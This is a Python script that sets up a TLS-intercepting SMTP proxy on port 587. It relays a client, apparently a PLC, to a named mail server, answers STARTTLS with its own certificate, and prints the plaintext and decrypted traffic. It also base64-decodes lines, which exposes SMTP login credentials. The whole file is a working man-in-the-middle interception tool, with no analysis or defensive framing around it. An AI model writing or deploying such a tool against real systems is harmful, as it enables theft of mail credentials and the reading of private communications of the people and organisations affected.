#!/usr/bin/env python3
import socket, ssl, threading, base64, re

# Ensure cert.pem and key.pem are in the same directory
CERTFILE = 'cert.pem'
KEYFILE = 'key.pem'

def try_decode(data):
    pattern = re.compile(r'^[A-Za-z0-9+/]+={0,2}$')
    if pattern.match(data) and len(data) > 4:
        try: return base64.b64decode(data).decode('utf-8')
        except: return None
    return None

def bridge(client_sock, remote_host, remote_port):
    remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_sock.connect((remote_host, remote_port))
    
    # Forward Initial Banner
    banner = remote_sock.recv(4096)
    client_sock.sendall(banner)
    
    # Loop for SMTP commands
    while True:
        data = client_sock.recv(4096)
        if not data: break
        
        # Log Plaintext
        decoded = try_decode(data.decode(errors='ignore').strip())
        print(f"PLC -> REMOTE: {data.decode(errors='ignore').strip()}")
        if decoded: print(f"   [DECODED]: {decoded}")

        if b"STARTTLS" in data.upper():
            remote_sock.sendall(data)
            remote_sock.recv(4096) # Read 220
            client_sock.sendall(b"220 2.0.0 Ready to start TLS\r\n")
            
            # Upgrade to SSL
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
            client_ssl = context.wrap_socket(client_sock, server_side=True)
            remote_ssl = ssl.wrap_socket(remote_sock, ssl_version=ssl.PROTOCOL_TLSv1_2)
            
            # Encrypted Relay Loop
            while True:
                data = client_ssl.recv(4096)
                if not data: break
                
                # Log Decrypted
                print(f"Decrypted: {data.decode(errors='ignore').strip()}")
                remote_ssl.sendall(data)
                
                resp = remote_ssl.recv(4096)
                client_ssl.sendall(resp)
            break
        else:
            remote_sock.sendall(data)
            client_sock.sendall(remote_sock.recv(4096))

# Server Listener
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 587))
server.listen(5)
print("[*] TLS SMTP Proxy Active on 0.0.0.0:587")

while True:
    client, addr = server.accept()
    threading.Thread(target=bridge, args=(client, 'mail.datakom.com.tr', 587)).start()
